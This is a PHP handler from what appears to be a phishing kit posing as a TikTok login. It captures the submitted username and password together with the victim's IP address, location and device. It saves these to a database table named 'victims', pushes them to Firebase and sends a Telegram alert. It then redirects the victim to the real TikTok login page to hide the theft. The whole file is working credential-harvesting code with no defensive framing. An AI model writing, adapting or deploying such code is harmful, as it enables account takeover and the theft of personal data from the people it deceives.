<?php
require_once 'includes/config.php';
require_once 'includes/functions.php';
require_once 'includes/db.php';
require_once 'includes/firebase.php';
require_once 'includes/telegram.php';

$username = $_POST['username'] ?? $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';
$ref = $_POST['ref'] ?? $_GET['ref'] ?? '';
$campaign = $_POST['campaign'] ?? $_GET['camp'] ?? 'Unknown';

if (empty($username) || empty($password)) {
    header("Location: https://www.tiktok.com");
    exit;
}

$ip = getClientIP();
$location = getLocation($ip);
$device = getDevice($_SERVER['HTTP_USER_AGENT']);
$session = generateSessionId();
$time = date('H:i:s');

$data = [
    'session' => $session,
    'username' => $username,
    'password' => $password,
    'device' => $device,
    'location' => $location['city'] . ', ' . $location['country'],
    'flag' => $location['flag'],
    'ip' => $ip,
    'country' => $location['country'],
    'time' => $time,
    'campaign' => $campaign,
    'status' => 'captured'
];

// Save to MySQL
try {
    $db = Database::getInstance();
    $db->insert('victims', $data);
} catch (Exception $e) {}

// Save to Firebase
try {
    $firebase = new Firebase();
    $firebase->push('logs', $data);
} catch (Exception $e) {}

// Send Telegram Alert
try {
    Telegram::sendVictimAlert($data);
} catch (Exception $e) {}

// Redirect to TikTok
header("Location: https://www.tiktok.com/login");
exit;
?>
